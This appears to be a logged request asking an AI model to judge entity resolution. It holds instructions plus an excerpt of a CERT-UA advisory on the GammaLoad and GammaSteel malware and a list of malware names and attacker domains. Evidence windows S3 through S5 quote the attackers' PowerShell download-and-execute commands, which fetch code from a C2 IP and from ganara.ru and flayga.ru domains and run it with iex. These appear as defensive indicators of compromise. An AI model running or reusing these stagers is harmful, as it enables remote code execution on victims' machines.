=== REQUEST (gemini gemini-3.7-flash) ===
--- sampling ---
{"temperature":0}
--- instructions ---
You are an entity-resolution judge for an incremental entity registry. For every mention you decide one thing: which entity it is. Hierarchy between entities is decided elsewhere — never answer it here.

The source lists its known entities once, as `E1…En`. Every mention names the subset of those entities that plausibly match it. Use the numbers; never write a name where a number is asked for. A mention may carry a `ctx:` reference naming the evidence window(s) (`S1. …`) that contain it.

## 1. `id` — identity (exact match)

Answer `"NEW"` when the mention refers to an entity that is none of its listed options; otherwise the option's `E` number. Only choose an existing entity when the supplied names and aliases support identity. Category, role, behavior, relationships, co-occurrence, and thematic similarity are NOT identity evidence. The order of options is retrieval score, which is not evidence.

Same entity — the names differ only in written form:

- a vendor, publisher, or organization prefix present in one ("Acme Foo" / "Foo");
- spacing, punctuation, hyphenation, case ("FooBar" / "Foo Bar");
- a parenthetical or bracketed descriptor ("foo (the loader used here)" / "foo");
- a file extension, platform, or implementation suffix ("foo.bin" / "foo", "Foo .NET" / "Foo");
- a generic type word stating only what kind of thing it is ("Foo tool" / "Foo");
- an acronym beside its own expansion;
- a transliteration or translation of the same proper name.

Different entities, however related — version, edition, year or identifier differs; one is a part, component or member of the other; one is a file or artifact and the other the program that made it; the base names differ. When names are alike except for an identifier or a number, match those characters exactly and never choose an option whose identifier differs. When a name pairs a structured identifier with a descriptive label — in either order, one of them usually bracketed ("K-12 (Foo)", "Foo (K-12)") — the identifier is what the name identifies. Choose the option carrying that identifier, and treat the bare label on its own as a different, broader entity.

If in doubt, answer `"NEW"`: a duplicate is repairable, a wrong merge is not.

## 2. `g` — gloss

For every mention you did NOT link, one short factual description — at most twelve words, grounded in the source, **not restating the name**. It is used to retrieve this entity later, never as identity evidence. Use `null` when the source says nothing descriptive.

## Output

Source context bears on identity only, and only where it explicitly establishes an alias, identifier, transliteration, abbreviation, or unambiguous co-reference.

Output one raw JSON object per line (JSONL), no markdown fences, no commentary, no wrapping array, one line per mention, in order, keys exactly `m`, `id`, `g`:
{"m":"M1","id":"E3","g":null}
{"m":"M2","id":"NEW","g":"a 2010 release of the suite"}

--- text ---
Source: "Кібератаки групи UAC-0010 (Armageddon): шкідливі програми GammaLoad, GammaSteel (CERT-UA#5134)" — evidence: S1. "ків, серед іншого, є викрадення файлів за визначеним переліком розширень, а також автентифікаційних даних Інтернет-браузерів, для чого застосовується GammaSteel.PS1 та GammaSteel.NET, відповідно. Вірогідно, GammaSteel.PS1 є PowerShell-реалізацією раніше використовуваного HarvesterX.</p><p>Крім того, однією з тактик зловмисників є ураження файлу шаблону C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Templates\Normal.dotm за допомо" S2. "ня персистентності та запуску пейлоадів використовуються заплановані завдання, гілка реєстру Run, а також змінні середовища. Активно використовується PowerShell (powershell.exe), а також wscript.exe, mshta.exe.</p><p><br></p><p><strong>Індикатори компрометації</strong></p><p><em>Файли:</em></p><pre class="ql-syntax" spellchec" S3. "ient).downloadString('hXXp://194.180.174.73/1.txt'); iex $aaa; C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe $dom=[string]$(Get-Random)+'.ganara.ru';$ip=[System.Net.DNS]::GetHostAddresses($dom);$url='hXXp://'+$ip+'/lnk.php';$tmp = $(New-Object net.webclient).DownloadString($url); [io.file]::Write" S4. "php') $tmp); iEx(IeX $tmp) C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe $ip = [System.Net.DNS]::GetHostAddresses([string]$(Get-Random)+'.flayga.ru');Start-Sleep -s 10;$IE1 = New-Object -COMObject InternetExplorer.Application -Property @{Navigate2=$([string]$ip+'/get.php'); Visible = $False};whil" S5. "x.txt') $Doc); iex(iex $Doc) C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe $ip=[System.Net.DNS]::GetHostAddress"
Entities:
E1. GammaLoad [aka GammaLoad.PS1]
E2. TRYxaEbX.ps1
E3. z.ps1
E4. GammaLoad.PS1_v2
E5. stage1.ps1
E6. stage2.ps1
E7. csrss.exe
E8. OUTSTEEL
E9. GraphSteel
E10. MSCommondll.exe
E11. ConfuserEx
E12. .NET Framework
E13. WhisperPack
E14. MarsStealer
E15. python-requests
E16. GrimPlant
E17. SOLOSHRED
E18. FTPGetter [aka WS_FTP]
E19. JesterStealer
E20. curl.exe [aka curl]
E21. Hashcat
E22. AWFULSHRED
E23. needrestart
E24. Meterpreter
E25. b.exe
E26. PowerShell [aka powershell.exe]
E27. 223329.exe
E28. POWERGAP
E29. Icloud.exe [aka Iclouding.exe]
E30. wscript.exe
E31. 62ea.exe
E32. SPECTR.Shell
E33. 966449.exe
E34. GammaSteel.NET
E35. HarvesterX
E36. PowerShell (powershell.exe)
E37. GammaSteel.PS1
E38. acteran.ru [aka erwini.ru, ryomy.ru, apoxipodes.ru, omyce.ru, emterox.ru, mulleti.ru]
E39. bilitora.ru
E40. tortunas.ru
E41. fishitor.ru
E42. arentuk.com
E43. billyhot.ru
E44. tiloraso.ru
E45. circulas.ru
E46. candidar.ru
E47. kopratiso.ru
E48. dodortar.ru
E49. lnk-upload.dodortar.ru
E50. dod-upload.dodortar.ru
E51. motocheck.in
E52. nikotod.ru
E53. successilin.top
E54. moskeet.com
E55. admru.top
E56. meteolink.host [aka stormpredictor.host, netbin.host, syncapp.host]
E57. bul-opros.top
E58. olei.ro
E59. peer-gos.top
E60. baidencult.com
E61. iol.pt
E62. rmssrv3.ru
E63. xsph.ru
E64. rmssrv4.ru
E65. gopoppers.com
E66. co-opros.top
E67. podologaneri.it
E68. districoperav.icu
E69. co-uah.top
E70. potrakit.ru
E71. giraffe-tour.ru
E72. rivierafamily.com
E73. naffalno.site
E74. nitikora.ru
E75. tridiuma.ru
E76. fluoxi.com
E77. golgba.com
E78. yandex.ru
E79. ghaniyu.com
E80. varanasiclick.ru
E81. www.msftncsi.com
E82. jevejosader.top
E83. enlamentedeunasesor.com
E84. milotrad.ru
E85. milotraf.ru
E86. 3utilities.com
E87. kesp.cl
E88. s8.h.mchost.ru
E89. aspe.ro
E90. rmssrv2.ru
E91. pastebin.com
E92. leonardis.ru
E93. jokotras.ru
E94. afi-opros.top
E95. dogiraftig.com
E96. admus.top
E97. mitraseo.hol.es
E98. parodadoca.ru
E99. marmaris.com.ua
E100. nx0.ru
E101. ncscc.gov.ua
E102. wi-opros.top
E103. xcasinobonuses.net
E104. whoer.net
E105. servebeer.com
E106. evil.server.com
E107. dyndns.com
E108. agreminj.com
E109. ddns.net
E110. airmauritiusticket.com
E111. freedynamicdns.net
E112. bounceme.net
E113. domthr.xyz
E114. plexbd.net
E115. sytes.net
E116. brunoboys.net
E117. winscp.net
E118. viewdns.net
E119. dcshost.net
E120. gov-ua.info
E121. president.gov.ua.administration.vakansiyi.administration.president.gov-ua.info
E122. freedynamicdns.org
E123. ns.ns2-dns.com [aka ns2-dns.com]
E124. ns.ns3-dns.com [aka ns3-dns.com]
E125. datagroup.ddns.net
E126. expeditionabroad.com
E127. www.facebook.com
E128. www.michiganmastereltiempo.com
E129. webknives.com
E130. www.symantec.com
E131. winchconstruction.com
E132. atlantar.ru
E133. motoristo.ru
E134. moolin.ru
E135. bubenci.ru
E136. callsol.ru
E137. clipperso.ru
E138. cooperi.ru
E139. detroito.ru
E140. farafauler.ru
E141. flayga.ru
E142. ganara.ru
E143. hawksi.ru
E144. hofsteder.ru
E145. kilitro.ru
E146. kurapat.ru
E147. lnasfe.ru
E148. lopasts.ru
E149. mafirti.ru
E150. metanat.ru
E151. mitlubald.ru
E152. paparat.ru
E153. pasamart.ru
E154. qkcew.ru
E155. rncsq.ru
E156. tarlit.ru
E157. tbwelo.ru
E158. wicksl.ru
E159. xcqef.ru
E160. nxkad.ru
E161. dnslookup.seowebchecker.com
E162. tools.nexcess.net
